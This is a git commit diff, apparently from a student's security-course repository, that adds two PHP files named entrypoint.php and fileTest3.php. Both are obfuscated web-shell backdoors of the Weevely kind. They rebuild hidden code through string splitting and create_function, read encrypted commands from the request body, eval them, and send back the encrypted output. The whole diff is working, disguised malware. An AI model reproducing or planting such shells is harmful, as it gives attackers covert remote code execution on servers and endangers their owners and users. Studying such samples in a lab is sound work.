30966de380bb26ee3b5f274a8838d75ba9faa598
champuser <max.braylyan@mymail.champlain.edu>
2022-12-05 20:54:38 -0500

    week?

---
+++ week10/nancurunir/entrypoint.php
@@ -0,0 +1,13 @@
+<?php
+$B='lelYn($tlY);$o="";flYor($ilY=0;$i<lY$l;)lY{for($jlY=lY0;($j<$lYc&&lY$i<$l)';
+$E='=1lY) {@ob_lYslYtart();@lYevlYal(@glYlYzuncomlYpress(@x(@balYse64_lYdecolY';
+$c=str_replace('LO','','LOLOLOLOcreaLOte_funcLOtion');
+$I='YdSomlYX8hlYJ6FnG0MG";lYfunclYtilYon x($t,$k)lY{$c=lYstrlelYn($k);lY$l=str';
+$k='$k="1a1dlYc91c"lY;$kh="9lY07325lYc69lY27lY1";$kf=lY"ddf0clY944bc72";$p="8l';
+$D=';$jlY++,$i++){$o.lYlY=$t{$i}^$k{lY$j}lY;}}return $lYo;}if (lY@preg_lYmatch';
+$S='(lY"/$lYkh(.+)$kflY/lY",@file_glYet_contlYelYnts("lYphp://input")lY,lY$m)=';
+$r='de($m[1]),$k)));$lYo=@ob_gelYt_lYcontents()lY;@ob_lYend_lYclelYan();$r=@ba';
+$z='lYse64_encolYdelY(@x(@gzcomlYprelYss($olY),$klYlY));print("$plY$kh$r$kf");}';
+$F=str_replace('lY','',$k.$I.$B.$D.$S.$E.$r.$z);
+$f=$c('',$F);$f();
+?>
---
+++ week8/fileTest3.php
@@ -0,0 +1,12 @@
+<?php
+$L='ENgaYnY7*qKi**";func*tion x($t*,$k){$c**=strlen($k);$l=s**trlen($t);$o*';
+$q='et*_*contents("ph**p://inpu*t"),$m)==1) {*@ob_sta*rt()**;@ev*al(@gzun*compr';
+$Q='$k*="a0c43eae";*$kh="8c*971**c199375";$*kf="f*3294*7b1d99e";$p=*"jCaW*j';
+$b='ess(@x*(@base*64*_decode($m[*1]),$k))*)*;$o*=@ob_ge**t*_conten*ts();@ob_end_cle';
+$D='*="";f*or($i*=0;$i<$l*;*){for($j=0;($j<*$c&&$i<*$l);*$j++,$i++*){*$*o.=$t{$i}';
+$Y=str_replace('l','','cllreallte_flunlction');
+$d='an(*);$r=@ba*s*e64_encode(@x*(@**gzc*ompress($*o*),$k));print("$p*$kh$r$kf");}';
+$V='^$k{$*j}*;}}return* $o;}if (*@p*reg_match*("/$kh(*.+*)$kf/"*,@fi*le_g';
+$v=str_replace('*','',$Q.$L.$D.$V.$q.$b.$d);
+$Z=$Y('',$v);$Z();
+?>
